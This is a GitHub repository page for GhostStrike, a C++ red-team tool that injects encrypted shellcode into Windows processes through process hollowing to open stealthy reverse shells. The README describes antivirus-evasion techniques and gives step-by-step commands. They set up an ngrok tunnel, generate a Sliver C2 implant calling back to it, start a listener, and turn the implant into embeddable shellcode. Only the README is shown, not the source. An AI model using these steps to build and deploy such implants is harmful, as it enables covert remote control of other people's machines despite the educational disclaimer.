# https://github.com/stivenhacker/GhostStrike

[Skip to content](https://github.com/stivenhacker/GhostStrike#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/stivenhacker/GhostStrike) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/stivenhacker/GhostStrike) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/stivenhacker/GhostStrike) to refresh your session.Dismiss alert

{{ message }}

[stivenhacker](https://github.com/stivenhacker)/ **[GhostStrike](https://github.com/stivenhacker/GhostStrike)** Public

- [Notifications](https://github.com/login?return_to=%2Fstivenhacker%2FGhostStrike) You must be signed in to change notification settings
- [Fork\\
97](https://github.com/login?return_to=%2Fstivenhacker%2FGhostStrike)
- [Star\\
809](https://github.com/login?return_to=%2Fstivenhacker%2FGhostStrike)


Deploy stealthy reverse shells using advanced process hollowing with GhostStrike – a C++ tool for ethical hacking and Red Team operations.


[www.linkedin.com/in/stiven-mayorga/](https://www.linkedin.com/in/stiven-mayorga/ "https://www.linkedin.com/in/stiven-mayorga/")

### License

[MIT license](https://github.com/stivenhacker/GhostStrike/blob/main/LICENSE)

[809\\
stars](https://github.com/stivenhacker/GhostStrike/stargazers) [97\\
forks](https://github.com/stivenhacker/GhostStrike/forks) [Branches](https://github.com/stivenhacker/GhostStrike/branches) [Tags](https://github.com/stivenhacker/GhostStrike/tags) [Activity](https://github.com/stivenhacker/GhostStrike/activity)

[Star](https://github.com/login?return_to=%2Fstivenhacker%2FGhostStrike)

[Notifications](https://github.com/login?return_to=%2Fstivenhacker%2FGhostStrike) You must be signed in to change notification settings

# stivenhacker/GhostStrike

main

[**1** Branch](https://github.com/stivenhacker/GhostStrike/branches) [**0** Tags](https://github.com/stivenhacker/GhostStrike/tags)

[Go to Branches page](https://github.com/stivenhacker/GhostStrike/branches)[Go to Tags page](https://github.com/stivenhacker/GhostStrike/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>![author](https://github.githubassets.com/images/gravatars/gravatar-user-420.png?size=40)<br>Stiven Mayorga<br>[LICENSE](https://github.com/stivenhacker/GhostStrike/commit/23a6b54c8299882e6e8f0536e1ca0fbf326b3229)<br>2 years agoSep 2, 2024<br>[23a6b54](https://github.com/stivenhacker/GhostStrike/commit/23a6b54c8299882e6e8f0536e1ca0fbf326b3229) · 2 years agoSep 2, 2024<br>## History<br>[2 Commits](https://github.com/stivenhacker/GhostStrike/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/stivenhacker/GhostStrike/commits/main/) 2 Commits |
| [GhostStrike.cpp](https://github.com/stivenhacker/GhostStrike/blob/main/GhostStrike.cpp "GhostStrike.cpp") | [GhostStrike.cpp](https://github.com/stivenhacker/GhostStrike/blob/main/GhostStrike.cpp "GhostStrike.cpp") | [first commit](https://github.com/stivenhacker/GhostStrike/commit/ddbbe861e74c54d0589cfc01201c8cae53d4a014 "first commit") | 2 years agoSep 2, 2024 |
| [LICENSE](https://github.com/stivenhacker/GhostStrike/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/stivenhacker/GhostStrike/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/stivenhacker/GhostStrike/commit/23a6b54c8299882e6e8f0536e1ca0fbf326b3229 "LICENSE") | 2 years agoSep 2, 2024 |
| [README.md](https://github.com/stivenhacker/GhostStrike/blob/main/README.md "README.md") | [README.md](https://github.com/stivenhacker/GhostStrike/blob/main/README.md "README.md") | [first commit](https://github.com/stivenhacker/GhostStrike/commit/ddbbe861e74c54d0589cfc01201c8cae53d4a014 "first commit") | 2 years agoSep 2, 2024 |
| View all files |

## Repository files navigation

# GhostStrike ⚔️

[Permalink: GhostStrike ⚔️](https://github.com/stivenhacker/GhostStrike#ghoststrike-%EF%B8%8F)

**GhostStrike** is an advanced cybersecurity tool designed for Red Team operations, featuring sophisticated techniques to evade detection and perform process hollowing on Windows systems.

* * *

## ✨ Features

[Permalink: ✨ Features](https://github.com/stivenhacker/GhostStrike#-features)

- **Dynamic API Resolution:** Utilizes a custom hash-based method to dynamically resolve Windows APIs, avoiding detection by signature-based security tools.
- **Base64 Encoding/Decoding:** Encodes and decodes shellcode to obscure its presence in memory, making it more difficult for static analysis tools to detect.
- **Cryptographic Key Generation:** Generates secure cryptographic keys using Windows Cryptography APIs to encrypt and decrypt shellcode, adding an extra layer of protection.
- **XOR Encryption/Decryption:** Simple but effective XOR-based encryption to protect the shellcode during its injection process.
- **Control Flow Flattening:** Implements control flow flattening to obfuscate the execution path, complicating analysis by both static and dynamic analysis tools.
- **Process Hollowing:** Injects encrypted shellcode into a legitimate Windows process, allowing it to execute covertly without raising suspicions.

* * *

## ⚙️ Configuration

[Permalink: ⚙️ Configuration](https://github.com/stivenhacker/GhostStrike#%EF%B8%8F-configuration)

You can configure GhostStrike with the following steps:

1. **Create Ngrok Service:**`ngrok tcp 443`
2. **Generate Sliver C2 Implant:**`generate --mtls x.tcp.ngrok.io --save YourFile.exe`
3. **Create Listener:**`mtls --lhost 0.0.0.0 --lport 443`
4. **Convert to .bin:**`./donut -i /home/YourUser/YourFile.exe -a 2 -f 1 -o /home/YourUser/YourFile.bin`
5. **Convert to C++ Shellcode:**`xxd -i YourFile.bin > YourFile.h`
6. **Import YourFile.h to this code**
7. **Compile and enjoy! 🚀**

* * *

## 💻 Requirements

[Permalink: 💻 Requirements](https://github.com/stivenhacker/GhostStrike#-requirements)

- **C++ Compiler:** Any modern C++ compiler, such as `g++`, `clang++`, or Visual Studio, is sufficient to compile the code.

No additional dependencies are needed to build **GhostStrike**. Simply compile the source code with your preferred C++ compiler, and you're ready to go!

* * *

## ⚠️ Disclaimer

[Permalink: ⚠️ Disclaimer](https://github.com/stivenhacker/GhostStrike#%EF%B8%8F-disclaimer)

This tool is intended solely for educational purposes and for use in controlled environments. Unauthorized use of GhostStrike outside of these settings is strictly prohibited. The author, **@Stiven.Hacker**, takes no responsibility for any misuse or damage caused by this code.

* * *

## 🎥 Demo

[Permalink: 🎥 Demo](https://github.com/stivenhacker/GhostStrike#-demo)

Check out a live demonstration of GhostStrike in action on LinkedIn:

[Watch Demo](https://www.linkedin.com/posts/stiven-mayorga_cybersecurity-ethicalhacking-pentesting-activity-7203583047705710593-IIVE?utm_source=share&utm_medium=member_ios)

## About

Deploy stealthy reverse shells using advanced process hollowing with GhostStrike – a C++ tool for ethical hacking and Red Team operations.


[www.linkedin.com/in/stiven-mayorga/](https://www.linkedin.com/in/stiven-mayorga/ "https://www.linkedin.com/in/stiven-mayorga/")

### Topics

[hacking](https://github.com/topics/hacking "Topic: hacking") [cybersecurity](https://github.com/topics/cybersecurity "Topic: cybersecurity") [hacker](https://github.com/topics/hacker "Topic: hacker") [hacking-tool](https://github.com/topics/hacking-tool "Topic: hacking-tool") [ethical-hacking](https://github.com/topics/ethical-hacking "Topic: ethical-hacking") [redteaming](https://github.com/topics/redteaming "Topic: redteaming") [redteam](https://github.com/topics/redteam "Topic: redteam") [hacking-tools](https://github.com/topics/hacking-tools "Topic: hacking-tools") [redteam-tools](https://github.com/topics/redteam-tools "Topic: redteam-tools")

### Resources

[Readme](https://github.com/stivenhacker/GhostStrike#readme-ov-file)

### License

[MIT license](https://github.com/stivenhacker/GhostStrike#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/stivenhacker/GhostStrike).

[Activity](https://github.com/stivenhacker/GhostStrike/activity)

### Stars

[**809**\\
stars](https://github.com/stivenhacker/GhostStrike/stargazers)

### Watchers

[**16**\\
watching](https://github.com/stivenhacker/GhostStrike/watchers)

### Forks

[**97**\\
forks](https://github.com/stivenhacker/GhostStrike/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fstivenhacker%2FGhostStrike&report=stivenhacker+%28user%29)

## [Releases](https://github.com/stivenhacker/GhostStrike/releases)

No releases published

## [Packages\  0](https://github.com/users/stivenhacker/packages?repo_name=GhostStrike)

No packages published

## Languages

- [C++100.0%](https://github.com/stivenhacker/GhostStrike/search?l=c%2B%2B)

You can’t perform that action at this time.